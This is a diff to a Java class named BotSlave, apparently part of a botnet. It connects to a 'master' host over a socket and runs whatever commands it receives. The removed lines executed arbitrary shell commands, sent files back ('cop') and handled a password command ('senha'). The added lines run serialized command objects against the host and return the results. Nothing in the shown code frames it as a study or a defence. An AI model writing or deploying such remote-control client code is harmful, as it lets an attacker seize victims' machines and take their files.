@@ -24,11 +24,13 @@ public class BotSlave {
     private static ObjectInputStream in;
     private static Object retorno = "";
     private static String ip;
+    private static Host thisHost;
     
     BotSlave() throws InterruptedException{
+        /*
         Ip verifica = new Ip();
         while(true){
-            executarComando("ifconfig");
+            executarComando("ipconfig");
             System.out.println(retorno);
             //String ip = retorno
             String vet[] = ip.toString().split(" ");
@@ -45,49 +47,36 @@ public class BotSlave {
             
             
         }
+        */
     }
     
     public static void main(String argv[]) throws Exception {
+        thisHost = new Host();
+        
+        
         new BotSlave();
         Object sentence;
         String modifiedSentence;
+        
+        //estabelecendo conexao com master
         try (Socket clientSocket = new Socket(ip, 1099)) {
-
-             out = new ObjectOutputStream(clientSocket.getOutputStream());
-             in = new ObjectInputStream(clientSocket.getInputStream());
-           
-           
-            String comando = "";
-            String vet[];
-             while(true){
-                 try{
-                     comando = in.readObject().toString();
-                    
-                     System.out.println(comando);
-                     if(comando != null || comando != ""){
-                        vet = comando.split(" ");
-                        if(vet[0].equals("cop")){
-                            retorno = (byte[]) enviarArquivos(vet[1]);
-                        }else if(vet[0].equals("senha")){
-                            String mense = "";
-                            for(int i = 1; i < vet.length; i++){
-                                mense += vet[i]+" ";
-                            }
-                            retorno = senha(mense);
+         
+            out = new ObjectOutputStream(clientSocket.getOutputStream());
+            in = new ObjectInputStream(clientSocket.getInputStream());
+            
+            Comando comando = new Comando();
                         
-                        }else{
-                            executarComando(comando);
-                        }
-                     }
-                     
-                     
-                    
-                     System.out.println(retorno+"\n\nEnviando..\n");
-                     out.writeObject(retorno);
-                 }catch(EOFException err){
-                     System.err.println("Erro ao executar o comando");
-                 }
-             }
+            //aguarda novos comandos do Master  
+            while(true){
+                 comando = null;
+                 comando = (Comando)in.readObject();
+                 if(comando == null){
+                     break;
+                 }else{
+                     System.out.println("Novo comando recebido");
+                     out.writeObject(comando.executar(thisHost));
+                 }                   
+            }
  
 
          }catch(Exception err){
